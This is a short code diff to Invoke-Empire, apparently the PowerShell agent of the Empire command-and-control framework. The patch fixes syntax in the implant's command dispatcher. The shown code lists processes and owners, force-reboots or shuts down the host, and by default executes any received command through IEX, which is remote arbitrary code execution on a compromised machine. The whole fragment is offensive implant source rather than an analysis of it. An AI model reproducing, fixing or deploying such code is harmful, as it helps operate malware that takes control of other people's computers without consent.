@@ -351,7 +351,7 @@ function Invoke-Empire {
                 '(ps|tasklist)' {
                     $owners = @{};
                     Get-WmiObject win32_process | ForEach-Object {$o = $_.getowner(); if(-not $($o.User)) {$o='N/A'} else {$o="$($o.Domain)\$($o.User)"}; $owners[$_.handle] = $o};
-                    if($cmdargs -ne '') { $p = $cmdargs };
+                    if($cmdargs -ne '') { $p = $cmdargs }
                     else{ $p = "*" };
                     $output = Get-Process $p | ForEach-Object {
                         $arch = 'x64';
@@ -411,7 +411,7 @@ function Invoke-Empire {
                 '(reboot|restart)' { Restart-Computer -force };
                 shutdown { Stop-Computer -force };
                 default {
-                    if ($cmdargs.length -eq '') { $output = IEX $cmd | Out-String };
+                    if ($cmdargs.length -eq '') { $output = IEX $cmd | Out-String }
                     else { $output = IEX "$cmd $cmdargs" | Out-String };
                 }
             }
